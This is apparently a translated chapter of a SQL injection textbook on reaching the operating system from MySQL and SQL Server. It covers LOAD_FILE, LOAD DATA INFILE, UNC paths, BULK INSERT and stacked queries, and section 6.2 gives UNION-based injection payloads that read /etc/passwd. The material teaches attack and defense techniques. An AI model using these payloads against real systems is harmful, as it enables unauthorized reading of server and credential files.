### 第6章 利用操作系统

#### 6.1 导入作者信息到MySQL数据库
以下是将作者详细信息导入MySQL数据库的步骤：

1. **创建表**：首先，在MySQL控制台中运行以下命令，创建一个名为`authors`的表来存储作者的详细信息。
   ```sql
   mysql> CREATE TABLE authors (fname CHAR(50), sname CHAR(50), email CHAR(100), flag INT);
   Query OK, 0 rows affected (0.01 sec)
   ```

2. **加载数据**：当表准备好接收文本文件后，使用以下命令从文本文件`/tmp/users.txt`中读取数据并填充表：
   ```sql
   mysql> LOAD DATA INFILE '/tmp/users.txt' INTO TABLE authors FIELDS TERMINATED BY ',';
   Query OK, 11 rows affected (0.00 sec)
   Records: 11 Deleted: 0 Skipped: 0 Warnings: 0
   ```

3. **验证数据**：通过查询`authors`表的内容，可以确认文本文件已被完整地导入数据库中：
   ```sql
   mysql> SELECT * FROM authors;
   +-------------+-----------------+-------------------------------+------+
   | fname       | sname           | email                         | flag |
   +-------------+-----------------+-------------------------------+------+
   | Sumit       | Siddharth       | sumit.siddharth@fakedomain.com|    1 |
   | Dafydd      | Hartley         | dafydd.hartley@fakedomain.net |    1 |
   | Dave        |                 | dave@fakedomain.co.uk         |    1 |
   | Rodrigo     | Marcos          | rodrigo@fakedomain.com        |    1 |
   | Gary        | Oleary-Steele   | gary@fakedomain.com           |    1 |
   | Marco       | Slaviero        | marco@fakedomain.com          |    1 |
   | Erlend      | Oftedal         | erlend@fakedomain.com         |    1 |
   | Alberto     | Revelli         | r0ot@fakedomain.net           |    1 |
   | Alexander   | Kornbrust       | ak@fakedomain.com             |    1 |
   | Justin      | Clarke          | justine@fakedomain.com        |    1 |
   | Kevvie      | Fowler          | kevviefowler@fakedomain.com   |    1 |
   +-------------+-----------------+-------------------------------+------+
   11 rows in set (0.00 sec)
   ```

#### 6.2 使用LOAD_FILE函数读取文件
为了更加便捷地读取文件，MySQL提供了`LOAD_FILE`函数。该函数可以直接传递文件内容而无需创建表。

1. **读取任意文件**：
   ```sql
   mysql> SELECT LOAD_FILE('/tmp/test.txt');
   +----------------------------------------+
   | LOAD_FILE('/tmp/test.txt')             |
   +----------------------------------------+
   | This is an arbitrary file residing somewhere on the filesystem.
     It can be multi-line and it does not really matter how many lines are in it.|
   +----------------------------------------+
   1 row in set (0.00 sec)
   ```

2. **在SQL注入中的应用**：
   - 假设有一个易受攻击的内部网网站，允许用户搜索顾客。该站点直接将输出返回给浏览器，并显示生成的SQL查询作为DEBUG消息。
   - 搜索“a”时，结果如下图所示（图6-2）。

3. **使用UNION运算符读取/etc/passwd文件**：
   - 尝试使用以下代码读取/etc/passwd文件：
     ```sql
     ' UNION SELECT LOAD_FILE('/etc/passwd') #
     ```
   - 上述代码会返回错误消息，提示列数不匹配。因此，需要添加一列以保持列数一致：
     ```sql
     ' UNION SELECT NULL, LOAD_FILE('/etc/passwd') #
     ```
   - 结果如图6-3所示，服务器返回了数据库中的所有用户以及请求文件的内容。

#### 6.3 处理二进制文件
`LOAD_FILE`函数还可以处理二进制文件。可以通过以下步骤读取和处理二进制文件：

1. **创建表并插入二进制数据**：
   ```sql
   mysql> CREATE TABLE foo (line BLOB);
   Query OK, 0 rows affected (0.01 sec)

   mysql> INSERT INTO foo SET line = LOAD_FILE('/tmp/temp.bin');
   Query OK, 1 row affected (0.00 sec)

   mysql> SELECT HEX(line) FROM foo;
   +------------------+
   | HEX(line)        |
   +------------------+
   | 414190904112     |
   +------------------+
   1 row in set (0.00 sec)
   ```

2. **使用HEX函数处理二进制数据**：
   - 可以使用`HEX`函数将二进制数据转换为十六进制字符串，从而便于查看和处理。

3. **使用UNC路径读取远程文件**：
   - `LOAD_FILE`函数还支持UNC路径，可以从其他机器上读取文件：
     ```sql
     mysql> SELECT LOAD_FILE('//172.16.125.2/temp_smb/test.txt');
     +----------------------------------------------------+
     | LOAD_FILE('//172.16.125.2/temp_smb/test.txt')      |
     +----------------------------------------------------+
     | This is a file on a server far far away..          |
     +----------------------------------------------------+
     1 row in set (0.52 sec)
     ```

#### 6.4 Microsoft SQL Server
Microsoft SQL Server虽然在安全性方面有所改进，但在SQL注入攻击方面仍存在一些问题。以下是一些常见的攻击方法：

1. **BULK INSERT语句**：
   - 攻击者通常会利用`BULK INSERT`语句从远程SQL Server读取文件。例如，使用Microsoft SQL Query Analyzer进行测试：
     ```sql
     BULK INSERT Doof FROM 'C:\path\to\file.txt'
     ```

2. **堆叠查询**：
   - Microsoft SQL Server支持堆叠查询，这使得潜在攻击者的选项数量大大增加。SensePost已经开发了一系列工具，可以将注入点转换为DNS隧道、远程文件服务器甚至TCP连接代理。

通过这些步骤和示例，我们可以更好地理解和防御SQL注入攻击。